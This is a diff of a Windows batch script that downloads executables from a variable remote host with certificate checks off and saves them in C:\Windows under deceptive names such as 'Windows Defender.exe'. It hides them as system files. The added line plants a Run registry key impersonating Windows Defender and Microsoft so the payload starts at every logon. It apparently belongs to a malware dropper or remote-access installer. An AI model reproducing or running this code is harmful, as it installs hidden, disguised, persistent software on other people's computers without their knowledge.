@@ -2,7 +2,8 @@ attrib -s -h i "C:\Windows\nircmd.exe" && curl.exe -k %proxy% %host%/Capture/nir
 
 attrib -s -h i "C:\Windows\curl.exe" && curl.exe -k %proxy% %host%/Tools/curl.exe --output "C:\Windows\curl.exe" && attrib +s +h +i "C:\Windows\curl.exe"
 
-attrib -s -h i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe"
+attrib -s -h i "C:\Windows\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe --output "C:\Windows\Windows Defender.exe" && attrib +s +h +i "C:\Windows\Windows Defender.exe" && REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "C:\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
+
 
 attrib -s -h -i "C:\Windows\expose.exe" 
 if exist "C:\Windows\expose.exe" (
